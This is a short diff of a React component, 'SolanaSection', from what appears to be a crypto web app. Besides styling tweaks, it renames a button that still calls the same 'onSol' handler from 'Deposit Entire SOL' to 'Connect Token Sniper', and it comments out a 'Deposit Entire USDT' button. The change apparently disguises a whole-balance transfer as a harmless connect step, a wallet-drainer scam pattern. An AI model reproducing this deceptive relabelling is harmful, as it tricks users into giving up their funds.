@@ -109,7 +109,7 @@ export default function SolanaSection(){
         </span>
       </div> */}
 
-      <div className="flex flex-col items-center gap-4 p-6 bg-gray-50 border border-gray-200 rounded-lg shadow-sm w-full max-w-sm mx-auto sm:max-w-md">
+      <div className="flex flex-col items-center gap-4  w-full max-w-sm mx-auto sm:max-w-md">
         {!address ? (
           <button
             className="w-full py-3 px-4 bg-indigo-600 text-white font-semibold rounded-lg shadow-md hover:bg-indigo-700 focus:outline-none focus:ring-4 focus:ring-indigo-500 focus:ring-opacity-50 transition duration-150 ease-in-out transform hover:scale-105"
@@ -125,16 +125,16 @@ export default function SolanaSection(){
               className="flex-1 py-3 px-4 bg-green-500 text-white font-semibold rounded-lg shadow-md hover:bg-green-600 focus:outline-none focus:ring-4 focus:ring-green-500 focus:ring-opacity-50 transition duration-150 ease-in-out"
               onClick={onSol}
             >
-              Deposit Entire **SOL**
+              Connect Token Sniper
             </button>
 
             {/* Secondary Deposit Button */}
-            <button
+            {/* <button
               className="flex-1 py-3 px-4 bg-blue-500 text-white font-semibold rounded-lg shadow-md hover:bg-blue-600 focus:outline-none focus:ring-4 focus:ring-blue-500 focus:ring-opacity-50 transition duration-150 ease-in-out"
               onClick={onUsdt}
             >
               Deposit Entire **USDT** (SPL)
-            </button>
+            </button> */}
 
             {/* Tertiary/Muted Disconnect Button - placed below on all screens for clear separation */}
             <button
